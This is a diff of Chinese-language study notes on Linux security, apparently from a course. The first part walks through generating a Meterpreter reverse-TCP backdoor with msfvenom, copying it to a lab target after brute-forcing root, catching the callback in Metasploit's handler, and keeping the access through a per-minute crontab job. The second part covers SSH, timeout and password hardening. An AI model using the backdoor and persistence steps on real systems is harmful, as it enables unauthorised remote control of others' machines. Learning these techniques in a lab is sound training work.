@@ -523,10 +523,158 @@ ifconfig
     - -h：帮助
 #### Msfvenom生成后门文件
   - 第一步：在kali生成后门文件
-  ```
-  ┌──(root㉿kali)-[~]
-  └─# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell
+    ```
+    ┌──(root㉿kali)-[~]
+    └─# msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.10.224 lport=4444 -f elf -o shell
 
-  ```
+    ```
   - 第二步：确保开启linux靶机的root用户，并设置密码root（可以爆破以更改）
-  - 第三步：
+  - 第三步：在暴力破解成功的情况下，通过kal将后门文件发送到目标主机
+    - 在kali中发送后门文件致目标靶机的/mnt/下
+    ```
+    ┌──(root㉿kali)-[~]
+    └─# scp shell root@192.168.10.143:/mnt   
+    ```
+    - 暴力破解看看后门文件是否存在
+    - 上传可能会报错，由于kali缺少配置导致的，按照以下步骤修复
+    ```
+    ┌──(root㉿kali)-[~]
+    └─# mkdir .ssh          //创建 .ssh目录
+
+    ┌──(root㉿kali)-[~]
+    └─# vim .ssh/config       //在.ssh目录下创建config文件并进行编辑
+    ```
+    - config文件中添加以下内容
+    ```
+    Host *
+    HostkeyAlgorithms +ssh-rsa
+    PubkeyAcceptedKeyTypes +ssh-rsa
+    ```
+  - 第四步：控制靶机，添加执行权限
+    ```
+    ls -l /mnt
+    chmod 755 /mnt/shell
+    ```
+  - 第五步：控制靶机，后台运行后门程序
+    ```
+    /mnt/shell &
+    ```
+  - 第六步：kali中进入MSF，使用侦听脚本，建立连接
+    ```
+    ┌──(root㉿kali)-[~]
+    └─# msfconsole -q
+    msf6 > use exploit/multi/handler      //使用侦听程序
+    [*] Using configured payload generic/shell_reverse_tcp
+
+    msf6 exploit(multi/handler) > set lhost 192.168.10.224    //设置监听地址（监听的地址，本机地址）
+    lhost => 192.168.10.224
+    msf6 exploit(multi/handler) > set lport 4444      //设置监听端口
+    lport => 4444
+    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/  reverse_tcp     //设置载荷
+    msf6 exploit(multi/handler) > run     //运行
+    ```
+    - 如果远程连接不上，爆破多次执行/mnt/shell&
+    - 进入反弹连接获取用户信息
+      ```
+      meterpreter >         //在这个目录下就能执行想执行的文件了
+      ```
+### 创建计划任务自动运行后门程序
+#### 创建计划任务
+- Linux crontab命令
+  - crontab：计划任务，用来定期执行程序的命令
+  - crontab -e：编辑计划任务
+  - crontab -l：显示计划任务
+
+  在靶机中执行
+  ```
+  crontab -l
+  # m h dom mon dow command       //分 时 日 周 月 命令
+   30 6 *   *   *   命令          //每天6点30分执行命令
+   30 6 *   *   1-5 命令          //周1-5的六点三十分执行命令
+   30 6 1   *   *   命令          //每月第一天六点三十分执行命令
+   *  * *   *   *   命令          //每分钟执行一次命令
+  ```
+- 第一步：再靶机上创建计划任务
+  - -e：执行文字编辑器来设定计划任务，内定文字编辑器是vi
+  - EDITOR=vim：指定编辑器为vim
+    ```
+    EDITOR=vim crontab -e     //编写计划任务
+    * * * * * /mnt/shell&
+    ```
+- 第二步：验证计划
+    ```
+    ┌──(root㉿kali)-[~]
+    └─# msfconsole -q
+    msf6 > use exploit/multi/handler      //使用侦听程序
+    [*] Using configured payload generic/shell_reverse_tcp
+
+    msf6 exploit(multi/handler) > set lhost 192.168.10.224    //设置监听地址（监听的地址，本机地址）
+    lhost => 192.168.10.224
+    msf6 exploit(multi/handler) > set lport 4444      //设置监听端口
+    lport => 4444
+    msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/  reverse_tcp     //设置载荷
+    msf6 exploit(multi/handler) > run     //运行
+    ```
+- 会话放入后台运行
+  - background
+    - 在渗透的时候，有时需要执行其他任务，为了执行新任务，需要将当前的Meterpreter会话切换到后台，这时就需要用到background命令
+    ```
+    meterpreter > background      //将会话放入后台
+    sessions          //显示所有会话
+    sessions 4        //切换会话
+    然后重新运行
+    meterpreter > run
+    ```
+## Linux安全加固
+### Linux安全基线
+- 指的是使Linux各项配置都符合安全要求的基本标准
+  - 账号/密码：口令复杂度/wheel组……
+  - SSH登陆控制：禁root/该端口/密码/密钥验证……
+  - 文件权限控制
+  - 内核参数控制
+### 系统加固的影响
+- 可能会影响用户的使用习惯，影响系统易用性
+
+|加固项|建议措施|易用性影响|是否默认|
+|-|-|-|-|
+|登录失败次数限制|密码输错3次，锁定1分钟|锁定后需等待1分钟以后再试|是|
+|用户umask限制|设为077，新建文档仅自己可用|需要额外为文档指定权限|是|
+|su使用限制|只允许root和wheel组的用户使用su|其他用户使用su会失败|是|
+|SSH强加密|不支持CBC/MD5/SHA1弱算法，改为支持CTR/SHA2强算法|低版本的Xshel1/Putty客户端无法登入|是|
+|禁止root远程SSH|禁止root从网络通过SSH登入|要先以普通用户SSH登入，再切换或提权|否|
+|命令行超时限制|闲置5分钟自动退出|超时后需重新登录|否|
+|密码复杂度限制|不少于8位，字符组合3/4原则|不能为用户设置简单口令|否|
+|密码有效期|最长90天，过期前7天提示|过期后必须改密码才能进入系统|否|
+
+### 典型加固指导
+#### 禁止root远程SSH
+- 调整sshd服务端配置文件
+  ```
+  # vim /etc/ssh/sshd_config
+
+  Port 12345      //修改默认连接端口为12345
+  LoginGraceTime 1m         //修改用户登录验证过程的时长1分钟
+  PermitRootLogin no          //禁止root远程登陆（不影响sudo提权）
+  MaxAuthTries2             //单次连接最多重试两次验证
+  AllowUsers zhangsan@192.168.10.224    //添加白名单，仅允许zhangsan用户在192.168.10.224上访问
+
+  # /etc/init.d/ssh restart       //重启ssh服务
+  ```
+#### 命令行超时限制
+- 针对后续登录的所有用户
+  - 调整/etc/profile文件中的TMOUT变量值
+- 针对通过SSH登录的用户
+  - 调整/etc/ssh/sshd_config文件中的ClientAlivelnterval值
+```
+vim /etc/profile
+……
+export TMOUT=300            //闲置300秒退出
+```
+#### 密码有效期限制
+- 调整/etc/login.defs配置文件
+  - 此文件定义了useradd的默认设置，会影响后续新创建的用户
+  - 若有需要，也可能chage命令直接设置特定用户的密码参数
+    ```
+    # vim /etc/login.defs       //设置
+    ```
+#### 
